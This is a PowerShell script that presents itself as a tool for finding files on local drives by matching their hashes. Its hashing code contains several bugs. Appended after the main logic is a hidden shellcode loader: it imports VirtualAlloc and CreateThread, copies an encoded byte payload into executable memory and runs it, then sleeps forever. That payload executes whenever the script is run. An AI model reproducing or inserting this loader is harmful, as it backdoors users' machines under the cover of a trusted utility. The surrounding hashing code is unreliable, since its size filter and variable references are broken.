

[CmdletBinding()]
Param(
    [Parameter(Mandatory=$True,Position=1)]
        [String[]]$FileHashes,
    [Parameter(Mandatory=$False,Position=2)]
        [ValidateSet("MD5","SHA1","SHA256","SHA384","SHA512","RIPEMD160")]
        [string]$HashType = "SHA256",
    [Parameter(Mandatory=$False,Position=3)]
        [String]$BasePaths,
    [Parameter(Mandatory=$False,Position=4)]
        [String]$extRegex="\.(exe|sys|dll|ps1)$",
    [Parameter(Mandatory=$False,Position=5)]
        [int]$MinB=4096,
    [Parameter(Mandatory=$False,Position=6)]
        [int]$MaxB=10485760
) 

$ErrorActionPreference = "Continue"

function Get-LocalDrives
{
    
    foreach ($disk in (Get-WmiObject win32_logicaldisk -Filter "DriveType=3" | Select-Object -ExpandProperty DeviceID)) {
        [string[]]$drives += "$disk\"
    }
    
    $driveCount = $drives.Count.ToString()
    Write-Verbose "Found $driveCount local drives."
    return $drives
}

workflow Get-HashesWorkflow {
	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$True,Position=0)]
			[String]$BasePath,
		[Parameter(Mandatory=$True,Position=1)]
			[string[]]$SearchHashes,
		[Parameter(Mandatory=$True,Position=2)]
			[ValidateSet("MD5","SHA1","SHA256","SHA384","SHA512","RIPEMD160")]
			[string]$HashType = "SHA256",
		[Parameter(Mandatory=$False,Position=3)]
			[int]$MinB=4096,
		[Parameter(Mandatory=$False,Position=4)]
			[int]$MaxB=10485760,
		[Parameter(Mandatory=$False,Position=5)]
			[string]$extRegex="\.(exe|sys|dll|ps1)$"
	)

	
	
	
	
	
	
	
	
	
	
	
	
	
	
	
	$hashList = "" | Select-Object -Property File,Hash
	
	$Files = (
		Get-ChildItem -Force -Path $basePath -Recurse -ErrorAction SilentlyContinue | 
		? -FilterScript { 
			($_.Length -ge $MinB -and $_.Length -le $_.Length) -and 
			($_.Extension -match $extRegex) 
		} | 
		Select-Object -ExpandProperty FullName
	)

	foreach -parallel ($File in $Files) {
        
		sequence {
			$entry = inlinescript {
				switch -CaseSensitive ($using:HashType) {
					"MD5"       { $hash = [System.Security.Cryptography.MD5]::Create() }
					"SHA1"      { $hash = [System.Security.Cryptography.SHA1]::Create() }
					"SHA256"    { $hash = [System.Security.Cryptography.SHA256]::Create() }
					"SHA384"    { $hash = [System.Security.Cryptography.SHA384]::Create() }
					"SHA512"    { $hash = [System.Security.Cryptography.SHA512]::Create() }
					"RIPEMD160" { $hash = [System.Security.Cryptography.RIPEMD160]::Create() }
				}

				
				Write-Debug -Message "Calculating hash of $using:File."
				if (Test-Path -LiteralPath $using:File -PathType Leaf) {
					$FileData = [System.IO.File]::ReadAllBytes($using:File)
					$HashBytes = $hash.ComputeHash($FileData)
					$paddedHex = ""

					foreach( $byte in $HashBytes ) {
						$byteInHex = [String]::Format("{0:X}", $byte)
						$paddedHex += $byteInHex.PadLeft(2,"0")
					}
                
					Write-Debug -Message "Hash value was $paddedHex."
                    $hashes = $using:searchHashes
					
                    $index = $hashes.IndexOf($paddedHex)
                    if ($index -gt -1) {
                        $hashList.File = $using:File
                        $hashList.Hash = $hashes[$index]
                        $hashList
					}
				}
			}
            if ($entry) {
			    $workflow:hashList += $entry
            }
		}
    }

	return ,$hashList
}

function Get-Hashes {
	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$True,Position=0)]
			[String]$BasePath,
		[Parameter(Mandatory=$True,Position=1)]
			[string[]]$SearchHash,
		[Parameter(Mandatory=$True,Position=2)]
			[ValidateSet("MD5","SHA1","SHA256","SHA384","SHA512","RIPEMD160")]
			[string]$HashType = "SHA256",
		[Parameter(Mandatory=$False,Position=3)]
			[int]$MinB=4096,
		[Parameter(Mandatory=$False,Position=4)]
			[int]$MaxB=10485760,
		[Parameter(Mandatory=$False,Position=5)]
			[string]$extRegex="\.(exe|sys|dll|ps1)$"
	)

	
	

	$hashList = "" | Select-Object File,Hash
	
	$Files = (
		Get-ChildItem -Force -Path $basePath -Recurse -ErrorAction SilentlyContinue | 
		? -FilterScript { 
			($_.Length -ge $MinB -and $_.Length -le $_.Length) -and 
			($_.Extension -match $extRegex) 
		} | 
		Select-Object -ExpandProperty FullName
	)
	
	switch -CaseSensitive ($HashType) {
		"MD5"       { $hash = [System.Security.Cryptography.MD5]::Create() }
		"SHA1"      { $hash = [System.Security.Cryptography.SHA1]::Create() }
		"SHA256"    { $hash = [System.Security.Cryptography.SHA256]::Create() }
		"SHA384"    { $hash = [System.Security.Cryptography.SHA384]::Create() }
		"SHA512"    { $hash = [System.Security.Cryptography.SHA512]::Create() }
		"RIPEMD160" { $hash = [System.Security.Cryptography.RIPEMD160]::Create() }
	}
	
	foreach ($File in $Files) {
       
		Write-Debug -Message "Calculating hash of $File."
		if (Test-Path -LiteralPath $File -PathType Leaf) {
			$FileData = [System.IO.File]::ReadAllBytes($File)
			$HashBytes = $hash.ComputeHash($FileData)
			$paddedHex = ""

			foreach( $byte in $HashBytes ) {
				$byteInHex = [String]::Format("{0:X}", $byte)
				$paddedHex += $byteInHex.PadLeft(2,"0")
			}
               
			Write-Debug -Message "Hash value was $paddedHex."
            $index = $searchHashes.IndexOf($paddedHex)
			if ($index -gt -1) {
                $hashList.File = $Files
                $hashList.Hash = $hashes[$index]
                $objs += $hashList
			}
		}
	}
    $objs
}

function Get-Matches {
	[CmdletBinding()]
	Param (
		[Parameter(Mandatory=$True,Position=0)]
			[String]$BasePath,
		[Parameter(Mandatory=$True,Position=1)]
			[string[]]$SearchHash,
		[Parameter(Mandatory=$True,Position=2)]
			[ValidateSet("MD5","SHA1","SHA256","SHA384","SHA512","RIPEMD160")]
			[string]$HashType = "SHA256",
		[Parameter(Mandatory=$False,Position=3)]
			[int]$MinB=4096,
		[Parameter(Mandatory=$False,Position=4)]
			[int]$MaxB=10485760,
		[Parameter(Mandatory=$False,Position=5)]
			[string]$extRegex="\.(exe|sys|dll|ps1)$"
	)
	
	
	
	
	if ((Test-Path env:\PROCESSOR_ARCHITEW6432) -and ([Intptr]::Size -eq 4)) {
		$sysRegex = $env:SystemDrive.ToString() + "\\($|windows($|\\($|system32($|\\))))"
		if ($BasePath -match $sysRegex) {
			Write-Verbose  "Searching %windir%\System32 with a 32-bit process on a 64-bit host can return false negatives. See comments in Get-FilesByHash.ps1 module for details."
		}
	}

	$HashType = $HashType.ToUpper()

	try {
		$hashList = Get-HashesWorkflow -BasePath $BasePath -SearchHash $FileHashes -HashType $HashType -extRegex $extRegex -MinB $MinB -MaxB $MaxB
	}
	catch {
		Write-Verbose -Message "Workflows not supported. Running in single-threaded mode."
		$hashList = Get-Hashes -BasePath $BasePath -SearchHash $FileHashes -HashType $HashType -extRegex $extRegex -MinB $MinB -MaxB $MaxB
	}
    
    if ($hashList) {
		Write-Verbose "Found files matching hash $FileHash (TK)."    
		foreach($entry in $hashList) {
            $o = "" | Select-Object File, Hash
            $o.File = $entry
            $o.Hash = $FileHash 
            $o
        }
    }
	else {
		Write-Verbose "Found no matching files."
	}
}

if ($BasePaths.Length -eq 0) {
    Write-Verbose "No path specified, enumerating local drives."
    $BasePaths = Get-LocalDrives
}

foreach ($basePath in $BasePaths) {
    Write-Verbose "Getting file hashes for $basePath."
    Get-Matches -BasePath $BasePath -SearchHash $FileHashes -HashType $HashType -extRegex $extRegex -MinB $MinB -MaxB $MaxB
}
$SFcw = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $SFcw -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xd0,0xbd,0x13,0xb0,0x9a,0x4a,0xd9,0x74,0x24,0xf4,0x5f,0x2b,0xc9,0xb1,0x47,0x31,0x6f,0x18,0x03,0x6f,0x18,0x83,0xef,0xef,0x52,0x6f,0xb6,0xe7,0x11,0x90,0x47,0xf7,0x75,0x18,0xa2,0xc6,0xb5,0x7e,0xa6,0x78,0x06,0xf4,0xea,0x74,0xed,0x58,0x1f,0x0f,0x83,0x74,0x10,0xb8,0x2e,0xa3,0x1f,0x39,0x02,0x97,0x3e,0xb9,0x59,0xc4,0xe0,0x80,0x91,0x19,0xe0,0xc5,0xcc,0xd0,0xb0,0x9e,0x9b,0x47,0x25,0xab,0xd6,0x5b,0xce,0xe7,0xf7,0xdb,0x33,0xbf,0xf6,0xca,0xe5,0xb4,0xa0,0xcc,0x04,0x19,0xd9,0x44,0x1f,0x7e,0xe4,0x1f,0x94,0xb4,0x92,0xa1,0x7c,0x85,0x5b,0x0d,0x41,0x2a,0xae,0x4f,0x85,0x8c,0x51,0x3a,0xff,0xef,0xec,0x3d,0xc4,0x92,0x2a,0xcb,0xdf,0x34,0xb8,0x6b,0x04,0xc5,0x6d,0xed,0xcf,0xc9,0xda,0x79,0x97,0xcd,0xdd,0xae,0xa3,0xe9,0x56,0x51,0x64,0x78,0x2c,0x76,0xa0,0x21,0xf6,0x17,0xf1,0x8f,0x59,0x27,0xe1,0x70,0x05,0x8d,0x69,0x9c,0x52,0xbc,0x33,0xc8,0x97,0x8d,0xcb,0x08,0xb0,0x86,0xb8,0x3a,0x1f,0x3d,0x57,0x76,0xe8,0x9b,0xa0,0x79,0xc3,0x5c,0x3e,0x84,0xec,0x9c,0x16,0x42,0xb8,0xcc,0x00,0x63,0xc1,0x86,0xd0,0x8c,0x14,0x32,0xd4,0x1a,0x9d,0xf1,0xdb,0xd7,0xc9,0xf7,0xe3,0xfc,0x30,0x71,0x05,0x52,0x13,0xd1,0x9a,0x12,0xc3,0x91,0x4a,0xfa,0x09,0x1e,0xb4,0x1a,0x32,0xf4,0xdd,0xb0,0xdd,0xa1,0xb6,0x2c,0x47,0xe8,0x4d,0xcd,0x88,0x26,0x28,0xcd,0x03,0xc5,0xcc,0x83,0xe3,0xa0,0xde,0x73,0x04,0xff,0xbd,0xd5,0x1b,0xd5,0xa8,0xd9,0x89,0xd2,0x7a,0x8e,0x25,0xd9,0x5b,0xf8,0xe9,0x22,0x8e,0x73,0x23,0xb7,0x71,0xeb,0x4c,0x57,0x72,0xeb,0x1a,0x3d,0x72,0x83,0xfa,0x65,0x21,0xb6,0x04,0xb0,0x55,0x6b,0x91,0x3b,0x0c,0xd8,0x32,0x54,0xb2,0x07,0x74,0xfb,0x4d,0x62,0x84,0xc7,0x9b,0x4a,0xf2,0x29,0x18;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$XeXk=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($XeXk.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$XeXk,0,0,0);for (;;){Start-sleep 60};

